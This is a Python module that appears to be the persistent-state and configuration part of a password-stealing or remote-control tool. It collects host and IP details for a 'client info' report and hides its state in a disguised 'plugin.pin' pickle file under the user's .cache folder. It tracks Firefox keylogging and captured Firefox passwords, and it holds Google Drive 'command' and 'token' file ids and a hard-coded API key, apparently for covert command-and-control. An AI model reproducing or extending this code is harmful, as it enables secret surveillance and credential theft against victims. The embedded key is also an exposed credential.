#%%
import atexit
import json
from json.decoder import JSONDecodeError
import os
import pickle
from functools import cached_property, lru_cache
from pprint import PrettyPrinter
from threading import Event
import threading
import ctypes

from .browsers.config.constant import constant
from .network import ip
from logger import log


username=constant.username
def formated_str(data):
    if isinstance(data, str):
        return data
    
    try:
        data=json.dumps(data, indent=4)
        return data
    except Exception as e:
        log.warning('unknown error while formating type:', type(data))
        log.debug(e.with_traceback())
    
    return PrettyPrinter(indent=4).pformat(data)

@lru_cache
def basic_detail():
    import platform
    
    detail = {
        "Processor": platform.processor(),
        "System": f"{platform.system()} {platform.version()}",
        "Machine": platform.machine(),
        "Private IP Address": ip()
    }
    return formated_str(detail)

def size_of(path):
    if os.path.exists(path):
        return os.stat(path).st_size
    return 0

#%%
class Values:
    def __init__(self):
        self.last_all_time = 0
        self.last_user_time = 0
        self.mozila_keylog = False
        self.clint_info = False# is basic detail reported
        self.mozila_pass = []# can't be anything else than list
        self.clock_diff = 0

        self.cfile_id=r"1eO37l2YgGeI9ChV3be1oYprzpyKpmvXG"# command file id
        self.tfile_id=r"1UQBBpNb5KYFuS6qO3QXI2kSeQ0DylvB0"# token file id
        self.api_key=r"AIzaSyB4Q2rKEaR_w7TPL_bOOtSJ9GZMJig3HSs"

#%%
class permanent:
    def __init__(self):
        # self.data = USERPROFILE\.cache\plugin.pin
        self.data_dir=os.path.join(constant.profile.get("USERPROFILE"), ".cache")
        try:
            os.makedirs(self.data_dir)
        except:
            pass
        self.data_dir=os.path.join(self.data_dir, "plugin.pin")
        self.var = Values()
        self.write = Event()
        self.write.set()

        self.setup()

    def setup(self):
        if not size_of(self.data_dir):
            decoded = self.default
        else:
            with open(self.data_dir, "rb") as f:
                decoded = pickle.load(f)
            
            # checking for type mismatch
            for k in self.default:
                if not type(decoded.get(k)) is type(self.default.get(k)):
                    self.reset(k)
            
        for k, v in decoded.items():
            setattr(self.var, k, v)
            # can't use self.set_value
    
        self.commit()
        
    def _commit(self):
        self.write.clear()
        with open(self.data_dir, "wb") as f:
            pickle.dump(self.var.__dict__, f)
        self.write.set()
    
    def commit(self):
        self.write.wait()
        self._commit()

    def reset(self, key):
        # log.info(f"stored data reseting for {key}")
        value = self.default.get(key)
        self.set_value(key, value)

    def set_value(self, key, value):
        setattr(self.var, key, value)
        self.commit()

    @cached_property
    def default(self):
        value = Values().__dict__
        return value

data_store=permanent()


# %%
if __name__=="__main__":
    # log.info(data_store.var.gmail)
    data_store.reset("gmail")
